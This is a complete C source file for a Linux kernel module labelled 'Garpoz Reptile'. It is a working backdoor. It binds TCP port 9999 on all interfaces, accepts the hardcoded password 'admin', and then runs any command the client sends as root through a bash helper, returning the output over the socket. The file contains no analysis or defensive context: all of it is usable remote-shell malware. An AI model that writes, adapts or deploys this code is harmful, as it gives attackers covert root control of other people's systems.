#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/net.h>
#include <linux/socket.h>
#include <linux/in.h>
#include <linux/kthread.h>
#include <linux/slab.h>
#include <linux/string.h>
#include <linux/delay.h>
#include <linux/umh.h>
#include <linux/fs.h>
#include <linux/file.h>
#include <net/sock.h>

#define PORT 9999
#define PASSWORD "admin"

static struct socket *server_socket = NULL;
static struct task_struct *server_thread = NULL;
static bool server_running = false;

static void send_msg(struct socket *sock, const char *data)
{
    struct msghdr msg = {};
    struct kvec vec = { (char*)data, strlen(data) };
    kernel_sendmsg(sock, &msg, &vec, 1, strlen(data));
}

static void exec_cmd(struct socket *sock, const char *cmd)
{
    char *full_cmd = kmalloc(strlen(cmd) + 50, GFP_KERNEL);
    char *buffer = kmalloc(4096, GFP_KERNEL);
    char *argv[] = { "/bin/bash", "-c", full_cmd, NULL };
    char *envp[] = { "PATH=/sbin:/bin:/usr/bin", NULL };
    struct file *file;
    loff_t pos = 0;
    
    if (!full_cmd || !buffer) goto cleanup;
    
    snprintf(full_cmd, strlen(cmd) + 49, "%s > /tmp/out 2>&1", cmd);
    call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
    msleep(100);
    
    file = filp_open("/tmp/out", O_RDONLY, 0);
    if (!IS_ERR(file)) {
        int bytes = kernel_read(file, buffer, 4095, &pos);
        if (bytes > 0) {
            buffer[bytes] = '\0';
            send_msg(sock, buffer);
        }
        filp_close(file, NULL);
    }
    
cleanup:
    kfree(full_cmd);
    kfree(buffer);
}

static int handle_client(struct socket *sock)
{
    char *buf = kmalloc(1024, GFP_KERNEL);
    struct msghdr msg = {};
    struct kvec vec = { buf, 1023 };
    int len;
    
    if (!buf) return -ENOMEM;
    
    send_msg(sock, "Password: ");
    len = kernel_recvmsg(sock, &msg, &vec, 1, 1023, 0);
    
    if (len > 0) {
        buf[len] = '\0';
        if (buf[len-1] == '\n') buf[len-1] = '\0';
        
        if (strcmp(buf, PASSWORD) == 0) {
            send_msg(sock, "Welcome!\n");
            
            while (server_running) {
                send_msg(sock, "# ");
                memset(buf, 0, 1024);
                len = kernel_recvmsg(sock, &msg, &vec, 1, 1023, 0);
                
                if (len <= 0) break;
                buf[len] = '\0';
                if (buf[len-1] == '\n') buf[len-1] = '\0';
                
                if (strcmp(buf, "exit") == 0) break;
                if (strlen(buf) > 0) exec_cmd(sock, buf);
            }
        } else {
            send_msg(sock, "Access denied!\n");
        }
    }
    
    kfree(buf);
    return 0;
}

static int server_thread_func(void *data)
{
    struct socket *client_socket;
    int ret;
    
    while (!kthread_should_stop() && server_running) {
        ret = kernel_accept(server_socket, &client_socket, 0);
        if (ret < 0) {
            msleep(100);
            continue;
        }
        
        handle_client(client_socket);
        sock_release(client_socket);
    }
    return 0;
}

static int __init network_server_init(void)
{
    struct sockaddr_in addr = {};
    int ret;
    
    ret = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &server_socket);
    if (ret < 0) return ret;
    
    if (server_socket->sk) server_socket->sk->sk_reuse = SK_CAN_REUSE;
    
    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(PORT);
    
    if ((ret = kernel_bind(server_socket, (struct sockaddr*)&addr, sizeof(addr))) < 0 ||
        (ret = kernel_listen(server_socket, 5)) < 0) {
        sock_release(server_socket);
        return ret;
    }
    
    server_running = true;
    server_thread = kthread_run(server_thread_func, NULL, "network_server");
    if (IS_ERR(server_thread)) {
        server_running = false;
        sock_release(server_socket);
        return PTR_ERR(server_thread);
    }
    
    printk(KERN_INFO "network_server: Ready on port %d\n", PORT);
    return 0;
}

static void __exit network_server_exit(void)
{
    server_running = false;
    if (server_thread) kthread_stop(server_thread);
    if (server_socket) sock_release(server_socket);
    printk(KERN_INFO "network_server: Stopped\n");
}

module_init(network_server_init);
module_exit(network_server_exit);
MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("Garpoz Reptile");
MODULE_VERSION("1.0");
